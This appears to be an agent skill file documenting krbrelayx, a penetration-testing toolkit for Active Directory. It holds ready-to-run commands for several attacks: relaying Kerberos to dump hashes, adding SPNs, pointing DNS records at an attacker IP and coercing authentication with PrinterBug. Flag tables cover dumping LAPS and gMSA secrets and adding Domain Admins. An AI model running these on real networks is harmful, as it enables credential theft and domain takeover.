---
name: krbrelayx
description: A comprehensive toolkit for Kerberos relaying and unconstrained delegation abuse in Active Directory environments. Use it to relay Kerberos authentication, manipulate Service Principal Names (SPNs), manage AD-integrated DNS records via LDAP, and trigger authentication via the PrinterBug. It is essential for lateral movement, privilege escalation, and exploiting misconfigured delegation settings during penetration tests.
---

# krbrelayx

## Overview
krbrelayx is a specialized toolkit designed to exploit Kerberos-related vulnerabilities and Active Directory misconfigurations. It includes tools for relaying Kerberos tickets, abusing unconstrained delegation, modifying SPNs, and interacting with AD-integrated DNS. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume the tool is installed. If missing, use:
```bash
sudo apt install krbrelayx
```

## Common Workflows

### Relaying Kerberos to SMB
Relay incoming Kerberos authentications to a target server to dump hashes:
```bash
krbrelayx -t smb://target-server.domain.local -p YourPassword -s YourUsername
```

### Adding an SPN for Constrained Delegation Abuse
Add a new SPN to a computer account you control to facilitate delegation attacks:
```bash
addspn -u DOMAIN\user -p password -t target-computer$ -s service/host.domain.local ldap://dc.domain.local
```

### Creating a DNS Record via LDAP
Create an A record in AD-integrated DNS to point a hostname to your attacker IP:
```bash
dnstool -u DOMAIN\user -p password -r attacker-host.domain.local -a add -t A -d 10.0.0.5 dc.domain.local
```

### Triggering Authentication (PrinterBug)
Force a remote system to authenticate back to your listener:
```bash
printerbug.py 'domain/user:password'@target-server attacker-hostname
```

## Complete Command Reference

### krbrelayx (Main Relay Tool)
`krbrelayx [-h] [-debug] [-t TARGET] [-tf TARGETSFILE] [-w] [-ip INTERFACE_IP] [-r SMBSERVER] [-l LOOTDIR] [-f {ccache,kirbi}] [-codec CODEC] [-no-smb2support] [-wh WPAD_HOST] [-wa WPAD_AUTH_NUM] [-6] [-p PASSWORD] [-hp HEXPASSWORD] [-s USERNAME] [-hashes LMHASH:NTHASH] [-aesKey hex key] [-dc-ip ip address] [-e FILE] [-c COMMAND] [--enum-local-admins] [--no-dump] [--no-da] [--no-acl] [--no-validate-privs] [--escalate-user ESCALATE_USER] [--add-computer [COMPUTERNAME]] [--delegate-access] [--sid] [--dump-laps] [--dump-gmsa] [--dump-adcs] [--adcs] [--template TEMPLATE] [--altname ALTNAME] [-v TARGET]`

| Flag | Description |
|------|-------------|
| `-h, --help` | Show help message |
| `-debug` | Turn DEBUG output ON |
| `-t, --target` | Target to attack (Hostnames only, e.g., `smb://server:445`) |
| `-tf` | File containing targets (one per line) |
| `-w` | Watch target file for changes |
| `-ip, --interface-ip` | IP address of interface to bind SMB/HTTP servers |
| `-r` | Redirect HTTP requests to a file:// path on SMBSERVER |
| `-l, --lootdir` | Directory to store TGTs or dumps (default: current) |
| `-f, --format` | Ticket format: `ccache` (Impacket) or `kirbi` (Mimikatz) |
| `-codec` | Encoding for target output (default: utf-8) |
| `-no-smb2support` | Disable SMB2 Support |
| `-wh, --wpad-host` | Enable WPAD file for Proxy Auth attack |
| `-wa, --wpad-auth-num` | Prompt for auth N times for clients without MS16-077 |
| `-6, --ipv6` | Listen on both IPv6 and IPv4 |
| `-p, --krbpass` | Account password |
| `-hp, --krbhexpass` | Hex-encoded password |
| `-s, --krbsalt` | Case sensitive salt (Username) for key calculation |
| `-hashes` | NTLM hashes (LMHASH:NTHASH) |
| `-aesKey` | AES key for Kerberos Auth (128 or 256 bits) |
| `-dc-ip` | IP Address of the domain controller |
| `-e` | File to execute on target (defaults to secretsdump.py) |
| `-c` | Command to execute on target |
| `--enum-local-admins` | Attempt SAMR lookup for local admins |
| `--no-dump` | Do not attempt to dump LDAP information |
| `--no-da` | Do not attempt to add a Domain Admin |
| `--no-acl` | Disable ACL attacks |
| `--no-validate-privs` | Assume permissions are granted for ACL escalation |
| `--escalate-user` | Escalate privileges of specific user |
| `--add-computer` | Attempt to add a new computer account |
| `--delegate-access` | Delegate access on relayed computer account |
| `--sid` | Use a SID to delegate access |
| `--dump-laps` | Attempt to dump LAPS passwords |
| `--dump-gmsa` | Attempt to dump gMSA passwords |
| `--dump-adcs` | Dump ADCS enrollment services and templates |
| `--adcs` | Enable AD CS relay attack |
| `--template` | AD CS template (Default: Machine or User) |
| `--altname` | SAN for ESC1 or ESC6 attacks |
| `-v, --victim` | Victim name for certificate request |

### addspn
`addspn [-h] [-u USERNAME] [-p PASSWORD] [-t TARGET] [-T TARGETTYPE] [-s SPN] [-r] [-c] [-q] [-a] [-k] [-dc-ip ip address] [-aesKey hex key] HOSTNAME`

| Flag | Description |
|------|-------------|
| `HOSTNAME` | Hostname/IP or ldap:// connection string (Required) |
| `-u, --user` | DOMAIN\username for authentication |
| `-p, --password` | Password or LM:NTLM hash |
| `-t, --target` | Computer or user to target (FQDN or COMPUTER$) |
| `-T, --target-type` | Target type: `samname` or `hostname` |
| `-s, --spn` | servicePrincipalName to add (e.g., http/host.domain.local) |
| `-r, --remove` | Remove the SPN instead of adding |
| `-c, --clear` | Remove all SPNs |
| `-q, --query` | Show current target SPNs |
| `-a, --additional` | Add via msDS-AdditionalDnsHostName attribute |
| `-k, --kerberos` | Use Kerberos authentication (uses KRB5CCNAME) |
| `-dc-ip` | IP Address of the domain controller |
| `-aesKey` | AES key for Kerberos Authentication |

### dnstool
`dnstool [-h] [-u USERNAME] [-p PASSWORD] [--forest] [--legacy] [--zone ZONE] [--print-zones] [--print-zones-dn] [--tcp] [-k] [-port port] [-force-ssl] [-dc-ip ip address] [-dns-ip ip address] [-aesKey hex key] [-r TARGETRECORD] [-a {add,modify,query,remove,resurrect,ldapdelete}] [-t {A}] [-d RECORDDATA] [--allow-multiple] [--ttl TTL] HOSTNAME`

| Flag | Description |
|------|-------------|
| `HOSTNAME` | Hostname/IP or ldap:// connection string (Required) |
| `-u, --user` | DOMAIN\username for authentication |
| `-p, --password` | Password or LM:NTLM hash |
| `--forest` | Search ForestDnsZones instead of DomainDnsZones |
| `--legacy` | Search System partition (legacy DNS storage) |
| `--zone` | Zone to search in |
| `--print-zones` | Query all zones on the DNS server |
| `--print-zones-dn` | Print Distinguished Names of all zones |
| `--tcp` | Use DNS over TCP |
| `-k, --kerberos` | Use Kerberos authentication |
| `-port` | LDAP port (default: 389) |
| `-force-ssl` | Force SSL for LDAP |
| `-dc-ip` | IP Address of the domain controller |
| `-dns-ip` | IP Address of a DNS Server |
| `-aesKey` | AES key for Kerberos Authentication |
| `-r, --record` | Record to target (FQDN) |
| `-a, --action` | Action: `add`, `modify`, `query`, `remove`, `resurrect`, `ldapdelete` |
| `-t, --type` | Record type (Currently only `A` supported) |
| `-d, --data` | Record data (IP address) |
| `--allow-multiple` | Allow multiple A records for the same name |
| `--ttl` | TTL for record (default: 180) |

### printerbug
`printerbug [-h] [--verbose] [-target-file file] [-port [destination port]] [-timeout timeout] [-no-ping] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-dc-ip ip address] [-target-ip ip address] target attackerhost`

| Flag | Description |
|------|-------------|
| `target` | `[[domain/]username[:password]@]<targetName or address>` |
| `attackerhost` | Hostname to connect to |
| `--verbose` | Enable DEBUG output |
| `-target-file` | Use targets from a file |
| `-port` | Destination SMB port |
| `-timeout` | Timeout for TCP ping check |
| `-no-ping` | Skip TCP ping before connection |
| `-hashes` | NTLM hashes (LMHASH:NTHASH) |
| `-no-pass` | Don't ask for password (useful for proxying) |
| `-k` | Use Kerberos authentication |
| `-dc-ip` | IP Address of the domain controller |
| `-target-ip` | IP Address of the target machine (if name resolution fails) |

## Notes
- **Kerberos Targets**: `krbrelayx` requires hostnames for targets, not IP addresses, because Kerberos is identity-based.
- **PrinterBug**: This triggers the Print System Remote Protocol (MS-RPRN) to force a machine to authenticate to an attacker-controlled host.
- **LDAP Actions**: `dnstool` and `addspn` interact with AD via LDAP; ensure you have the correct credentials and network access to the Domain Controller's LDAP/S ports.